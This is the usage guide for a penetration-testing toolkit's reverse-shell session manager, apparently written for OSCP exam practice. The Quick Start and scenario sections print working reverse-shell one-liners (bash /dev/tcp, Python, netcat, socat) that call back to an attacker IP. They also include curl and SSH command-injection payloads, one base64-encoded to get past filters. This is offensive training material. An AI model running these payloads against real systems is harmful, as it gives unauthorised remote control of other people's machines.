# TCP Session Management - Complete Usage Guide

**CRACK Toolkit - Session Management Module**

Complete TCP reverse shell management with automated upgrade and stabilization.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Complete Workflow](#complete-workflow)
3. [CLI Commands](#cli-commands)
4. [OSCP Exam Scenarios](#oscp-exam-scenarios)
5. [Manual Alternatives](#manual-alternatives)
6. [Troubleshooting](#troubleshooting)

---

## Quick Start

### 1. Start TCP Listener

```bash
# Start listener on default port (4444)
crack session start

# Start on custom port
crack session start --port 9001

# Filter connections from specific target
crack session start --port 4444 --target 192.168.45.150
```

### 2. Catch Reverse Shell

On target machine, execute reverse shell:

```bash
# Bash TCP reverse shell
bash -i >& /dev/tcp/192.168.45.215/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.215",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat reverse shell (if nc -e available)
nc -e /bin/bash 192.168.45.215 4444

# Netcat with mkfifo (if nc -e unavailable)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.215 4444 >/tmp/f
```

**Session automatically created** when connection received.

### 3. List Sessions

```bash
# List all sessions
crack session list

# List active sessions only
crack session list --filter active

# Show detailed info
crack session list --verbose
```

### 4. Upgrade Shell to TTY

```bash
# Auto-upgrade (tries Python PTY, then alternatives)
crack session upgrade abc123 --method auto

# Force Python PTY method
crack session upgrade abc123 --method python

# Force script method
crack session upgrade abc123 --method script
```

### 5. Kill Session

```bash
# Kill session when done
crack session kill abc123
```

---

## Complete Workflow

### Scenario: Web Server RCE → Full Interactive Shell

#### Step 1: Prepare Listener

```bash
# Terminal 1: Start listener
crack session start --port 4444

# Output:
[+] Starting TCP listener on port 4444
[+] Listener ID: abc12345
[+] Waiting for connections...
```

#### Step 2: Trigger RCE

```bash
# Terminal 2: Exploit web server (example: command injection)
curl "http://192.168.45.150/vuln.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.215%2F4444%200%3E%261%27"
```

#### Step 3: Catch Shell

```
# Terminal 1 output:
[+] Connection received from 192.168.45.150:45678
[+] Session abc12345 created for 192.168.45.150:45678
[+] Detected: bash shell on linux
[+] Session abc12345 ready for interaction
```

#### Step 4: Upgrade Shell

```bash
# Terminal 3: Upgrade to full TTY
crack session upgrade abc12345 --method auto

# Output:
[+] Upgrading session abc12345
[+] Target: 192.168.45.150:45678
[+] Shell: bash
[+] Upgrading session abc12345 with Python PTY
[+] Payload: python3 -c 'import pty; pty.spawn("/bin/bash")'
[+] Session abc12345 upgraded to full PTY
[+] Stabilizing session abc12345
[+] Commands:
    stty raw -echo; fg
    export TERM=xterm-256color
    export SHELL=/bin/bash
[+] Session abc12345 fully stabilized

[+] Session upgraded successfully!
[+] PTY: True
[+] History: True
[+] Tab Completion: True
```

#### Step 5: Verify

```bash
# Test features
# - Press Ctrl+C (should not kill shell)
# - Use arrow keys (should navigate history)
# - Press Tab (should complete commands)
# - Run 'ls -la' (should display colors)
```

---

## CLI Commands

### `crack session start`

Start TCP listener for reverse shells.

**Usage:**
```bash
crack session start [OPTIONS]
```

**Options:**
- `--port, -p PORT`: Listen port (default: 4444 from config)
- `--target, -t IP`: Expected target IP (optional, for filtering)
- `--protocol PROTO`: Protocol type (tcp, http) [default: tcp]

**Examples:**
```bash
# Basic usage
crack session start

# Custom port
crack session start --port 9001

# Filter by target
crack session start --port 4444 --target 192.168.45.150
```

**Features:**
- Auto-detects shell type (bash, sh, zsh, powershell, cmd)
- Auto-detects OS (Linux, Windows, macOS)
- Handles multiple concurrent connections (max 10)
- Graceful shutdown on Ctrl+C

---

### `crack session list`

List active and historical sessions.

**Usage:**
```bash
crack session list [OPTIONS]
```

**Options:**
- `--filter, -f FILTER`: Filter sessions
  - `active` - Show only active sessions
  - `type:tcp` - Filter by type
  - `target:IP` - Filter by target IP
- `--verbose, -v`: Show detailed information

**Examples:**
```bash
# List all sessions
crack session list

# Active sessions only
crack session list --filter active

# TCP sessions only
crack session list --filter type:tcp

# Sessions to specific target
crack session list --filter target:192.168.45.150

# Detailed view
crack session list --verbose
```

**Output Format:**
```
ID       Type    Target           Port   Status    Shell      PTY
=========================================================================
abc12345 tcp     192.168.45.150   45678  active    bash       Yes
def67890 tcp     192.168.45.151   56789  dead      sh         No
```

---

### `crack session upgrade`

Upgrade basic shell to full interactive TTY.

**Usage:**
```bash
crack session upgrade SESSION_ID [OPTIONS]
```

**Arguments:**
- `SESSION_ID`: Session ID (full UUID or prefix)

**Options:**
- `--method METHOD`: Upgrade method
  - `auto` - Try all methods (default)
  - `python` - Python PTY spawn
  - `script` - Script command

**Examples:**
```bash
# Auto-upgrade (recommended)
crack session upgrade abc123 --method auto

# Force Python PTY
crack session upgrade abc123 --method python

# Force script method
crack session upgrade abc123 --method script
```

**Methods Explained:**

1. **Python PTY (Most Reliable)**
   - Requires: Python 2 or 3 on target
   - Provides: Full TTY, command history, tab completion
   - Works on: Most Linux systems

2. **Script Method**
   - Requires: `script` command (usually available)
   - Provides: Partial TTY (limited features)
   - Works on: Most Linux systems

**Success Indicators:**
- Ctrl+C doesn't kill shell
- Arrow keys work (command history)
- Tab completion works
- Terminal colors display correctly

---

### `crack session kill`

Terminate active session.

**Usage:**
```bash
crack session kill SESSION_ID
```

**Examples:**
```bash
# Kill by ID
crack session kill abc123

# Kill by full UUID
crack session kill abc12345-1234-5678-90ab-cdef12345678
```

**Behavior:**
- Terminates session process (if PID tracked)
- Marks session as 'dead' in storage
- Preserves session history for reporting

---

## OSCP Exam Scenarios

### Scenario 1: Web RCE → Shell Upgrade

**Common in OSCP: Web application command injection**

```bash
# Step 1: Start listener
crack session start --port 4444

# Step 2: Exploit web app
curl "http://target/vuln?cmd=$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxNS80NDQ0IDA+JjE= | base64 -d)"

# Step 3: Catch shell (automatic)
# Step 4: Upgrade
crack session upgrade abc123 --method auto

# Step 5: Verify Ctrl+C safety
# Press Ctrl+C - should not kill shell
```

**OSCP Note**: Base64 encoding bypasses some WAFs and filter restrictions.

---

### Scenario 2: SSH Command Injection → Shell

**OSCP: Command injection in SSH-accessible script**

```bash
# Step 1: Listener
crack session start --port 9001

# Step 2: Inject via SSH
ssh user@target "script.sh; bash -c 'bash -i >& /dev/tcp/192.168.45.215/9001 0>&1'"

# Step 3: Upgrade immediately
crack session upgrade abc123 --method python
```

---

### Scenario 3: Multiple Targets

**OSCP: Managing shells from multiple machines**

```bash
# Terminal 1: Listener for Box 1
crack session start --port 4444 --target 192.168.45.150

# Terminal 2: Listener for Box 2
crack session start --port 4445 --target 192.168.45.151

# Terminal 3: Monitor all sessions
watch -n 2 'crack session list --filter active'

# Upgrade both
crack session upgrade <box1-id> --method auto
crack session upgrade <box2-id> --method auto
```

---

## Manual Alternatives

**For OSCP Exam: When Automated Tools Fail**

### Manual Python PTY Upgrade

```bash
# Step 1: In reverse shell, spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell (Ctrl+Z)
^Z

# Step 3: Set terminal to raw mode
stty raw -echo; fg

# Step 4: Press Enter twice

# Step 5: Set environment
export TERM=xterm-256color
export SHELL=/bin/bash

# Step 6: Set terminal size
stty rows 24 cols 80
```

### Manual Script Upgrade

```bash
# If Python unavailable, use script
script /dev/null -c bash

# Test with arrow keys and Ctrl+C
```

### Manual Socat Upgrade (Advanced)

```bash
# On attacker (requires socat binary transfer)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target (after uploading socat binary)
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.215:4444
```

### Verification Tests

```bash
# Test 1: Ctrl+C safety
# Press Ctrl+C - should not kill shell

# Test 2: Arrow keys
# Press Up Arrow - should show command history

# Test 3: Tab completion
# Type 'ec' then Tab - should complete to 'echo'

# Test 4: Colors
ls -la --color=auto  # Should display colors
```

---

## Troubleshooting

### Issue: Listener Won't Start

**Error:** `Port 4444 already in use`

**Solution:**
```bash
# Check what's using port
sudo ss -tlnp | grep 4444

# Kill conflicting process
sudo kill <PID>

# Or use different port
crack session start --port 9001
```

---

### Issue: Upgrade Fails - Python Not Found

**Error:** `Python PTY upgrade failed`

**Solution:**
```bash
# Try Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Try alternative methods
crack session upgrade abc123 --method script

# Manual script upgrade
script /dev/null -c bash
```

---

### Issue: Session Marked as Dead

**Symptom:** Session shows `status: dead` after upgrade

**Cause:** Lost connection during upgrade

**Solution:**
```bash
# Re-exploit and get new shell
# Stabilize faster next time:
crack session upgrade abc123 --method python
```

---

### Issue: No PTY Features After Upgrade

**Symptom:** Ctrl+C still kills shell, no arrow keys

**Diagnosis:**
```bash
# Check session capabilities
crack session list --verbose | grep abc123
```

**Solution:**
```bash
# Try manual upgrade
# Follow "Manual Python PTY Upgrade" above
```

---

### Issue: Multiple Sessions, Can't Track

**Solution:**
```bash
# List with filters
crack session list --filter type:tcp --verbose

# Kill old sessions
for session in $(crack session list --filter dead | awk '{print $1}' | tail -n +2); do
    crack session kill $session
done
```

---

## Configuration

**Location:** `~/.crack/config.json`

```json
{
  "sessions": {
    "default_ports": {
      "tcp": 4444,
      "http": 8080
    },
    "auto_upgrade": true,
    "auto_stabilize": true
  },
  "variables": {
    "LHOST": {
      "value": "192.168.45.215",
      "description": "Attacker IP"
    },
    "LPORT": {
      "value": "4444",
      "description": "Listener port"
    }
  }
}
```

---

## Python API Usage

**For advanced automation:**

```python
from sessions.manager import SessionManager
from sessions.storage.base import SessionStorage
from sessions.config import SessionConfig
from sessions.listeners.tcp_listener import TCPListener
from sessions.shell.tcp_upgrader import TCPShellUpgrader
import asyncio

# Initialize
storage = SessionStorage()
config = SessionConfig()
manager = SessionManager(storage, config)

# Start listener
listener = TCPListener(port=4444, session_manager=manager)

async def main():
    # Start listener in background
    listener_task = asyncio.create_task(listener.start())

    # Wait for connection...
    await asyncio.sleep(5)

    # List sessions
    sessions = manager.list_sessions({'status': 'active'})

    if sessions:
        session = sessions[0]
        print(f"Found session: {session.id[:8]}")

        # Upgrade
        upgrader = TCPShellUpgrader(manager, config)
        success = upgrader.auto_upgrade(session)

        if success:
            print("Shell upgraded!")
        else:
            print("Upgrade failed - see manual instructions")
            print(upgrader.get_manual_upgrade_instructions(session))

asyncio.run(main())
```

---

## Best Practices for OSCP

1. **Always upgrade shells immediately**
   - Prevents accidental Ctrl+C kills
   - Enables tab completion for faster enum

2. **Use multiple listeners for multiple targets**
   - Separate ports per target
   - Easier to track which shell is which

3. **Practice manual upgrades**
   - Exam restrictions may limit automation
   - Know the underlying commands

4. **Verify upgrade success**
   - Test Ctrl+C, arrow keys, tab completion
   - Don't assume it worked

5. **Keep session history**
   - Sessions stored in `~/.crack/sessions/`
   - Review for report writing

---

## Success Criteria

✅ Listener starts on specified port
✅ Shell connection auto-creates session
✅ Shell type detected automatically
✅ Upgrade to TTY completes successfully
✅ Ctrl+C doesn't kill shell
✅ Arrow keys work (command history)
✅ Tab completion works
✅ Terminal colors display
✅ Session persists across network issues (future)

---

## Next Steps

- **HTTP Beacon Listener** (future): `crack session start --protocol http`
- **DNS C2 Listener** (future): `crack session start --protocol dns`
- **Session Multiplexing** (future): Multiple terminals to same shell
- **Auto PrivEsc Integration** (future): Auto-run LinPEAS/WinPEAS post-shell

---

**For More Information:**
- Architecture: `/home/kali/OSCP/crack/sessions/F0-A_FOUNDATION_REPORT.md`
- Reference: `/home/kali/OSCP/crack/reference/docs/`
- CRACK Track: `/home/kali/OSCP/crack/track/README.md`
